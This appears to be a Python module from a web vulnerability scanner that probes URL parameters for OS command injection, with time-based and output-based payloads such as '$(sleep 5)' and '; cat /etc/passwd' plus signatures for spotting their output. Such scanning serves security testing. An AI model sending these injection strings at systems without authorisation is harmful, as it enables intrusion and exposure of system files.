import requests
import time

# Command injection payloads
CMD_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "& timeout 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
]

# Output signatures
CMD_SIGNATURES = [
    "uid=", "gid=", "groups=",  # whoami/id output
    "root:", "bin:", "daemon:",  # cat /etc/passwd
    "volume serial number",      # dir (Windows)
    "directory of",              # dir (Windows)
]

def test_command_injection(url, params):
    """Test OS Command Injection."""
    results = []
    
    for param in params:
        # Test time-based
        for payload in CMD_PAYLOADS[:5]:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                start = time.time()
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                elapsed = time.time() - start
                
                if elapsed >= 4.5:  # Toleransi delay
                    results.append({
                        "type": "Command Injection (Time-based)",
                        "severity": "CRITICAL",
                        "param": param,
                        "payload": payload,
                        "detail": f"Response delay: {elapsed:.2f}s"
                    })
                    return results
            except requests.RequestException:
                pass
        
        # Test output-based
        output_payloads = ["; id", "| whoami", "& dir", "; cat /etc/passwd"]
        for payload in output_payloads:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text.lower()
                
                for sig in CMD_SIGNATURES:
                    if sig in body:
                        results.append({
                            "type": "Command Injection (Output-based)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"Command output terdeteksi (signature: '{sig}')"
                        })
                        return results
            except requests.RequestException:
                pass
    
    return results
